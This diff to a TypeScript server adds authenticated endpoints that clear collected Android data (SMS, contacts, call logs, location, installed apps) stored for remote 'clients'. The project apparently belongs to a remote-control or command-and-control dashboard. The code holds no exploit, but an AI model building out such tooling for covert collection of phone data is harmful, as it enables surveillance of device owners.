@@ -71,6 +71,18 @@ export async function handleClientRoutes(
     return null;
   }
 
+  // -- Android data clear: DELETE /api/clients/<id>/android/data/all --------
+  const androidClearAllMatch = url.pathname.match(/^\/api\/clients\/(.+)\/android\/data\/all$/);
+  if (req.method === "DELETE" && androidClearAllMatch) {
+    return handleAndroidClearAll(req, server, androidClearAllMatch[1], deps);
+  }
+
+  // -- Android data clear: DELETE /api/clients/<id>/android/data?type=X ---
+  const androidClearMatch = url.pathname.match(/^\/api\/clients\/(.+)\/android\/data$/);
+  if (req.method === "DELETE" && androidClearMatch) {
+    return handleAndroidClear(req, url, server, androidClearMatch[1], deps);
+  }
+
   if (url.pathname === "/api/clients") {
     const user = await authenticateRequest(req);
     if (!user) {
@@ -923,6 +935,56 @@ export async function handleClientRoutes(
     const ip = server.requestIP(req)?.address || "unknown";
     logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, targetClientId: targetId, details: groupId ? `set_group:${groupId}` : "clear_group", success: true });
     return Response.json({ ok: true, groupId }, { headers: deps.CORS_HEADERS });
+  }
+
+  const VALID_ANDROID_TYPES = ["device", "sms", "contacts", "calllog", "location", "apps"];
+
+  async function handleAndroidClear(req: Request, url: URL, server: RequestIpProvider, targetId: string, deps: ClientRouteDeps): Promise<Response> {
+    const user = await authenticateRequest(req);
+    if (!user) return new Response("Unauthorized", { status: 401 });
+    try { requirePermission(user, "clients:control"); } catch (e) {
+      return new Response((e as Error).message, { status: 403 });
+    }
+    if (!canUserAccessClient(user.userId, user.role, targetId)) {
+      return new Response("Forbidden", { status: 403 });
+    }
+
+    const dataType = (url.searchParams.get("type") || "").trim().toLowerCase();
+    const target = clientManager.getClient(targetId);
+    if (!target) return new Response("Client not found", { status: 404 });
+
+    if (!dataType || !VALID_ANDROID_TYPES.includes(dataType)) {
+      return Response.json({ error: "Invalid or missing type param. Valid: " + VALID_ANDROID_TYPES.join(", ") }, { status: 400 });
+    }
+
+    const msgType = "android_" + dataType;
+    if (target.androidData) {
+      delete target.androidData[msgType];
+    }
+    notifyDashboardViewers();
+    const ip = server.requestIP(req)?.address || "unknown";
+    logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND as any, targetClientId: targetId, details: "android_clear:" + dataType, success: true });
+    return Response.json({ ok: true, cleared: dataType }, { headers: deps.CORS_HEADERS });
+  }
+
+  async function handleAndroidClearAll(req: Request, server: RequestIpProvider, targetId: string, deps: ClientRouteDeps): Promise<Response> {
+    const user = await authenticateRequest(req);
+    if (!user) return new Response("Unauthorized", { status: 401 });
+    try { requirePermission(user, "clients:control"); } catch (e) {
+      return new Response((e as Error).message, { status: 403 });
+    }
+    if (!canUserAccessClient(user.userId, user.role, targetId)) {
+      return new Response("Forbidden", { status: 403 });
+    }
+
+    const target = clientManager.getClient(targetId);
+    if (!target) return new Response("Client not found", { status: 404 });
+
+    target.androidData = {};
+    notifyDashboardViewers();
+    const ip = server.requestIP(req)?.address || "unknown";
+    logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND as any, targetClientId: targetId, details: "android_clear:all", success: true });
+    return Response.json({ ok: true, cleared: "all" }, { headers: deps.CORS_HEADERS });
   }
 
   return null;
